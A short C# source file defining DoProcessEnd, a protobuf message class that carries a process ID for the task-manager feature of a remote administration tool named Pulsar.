﻿using ProtoBuf;
using Pulsar.Common.Messages.other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [ProtoContract]
    public class DoProcessEnd : IMessage
    {
        [ProtoMember(1)]
        public int Pid { get; set; }
    }
}
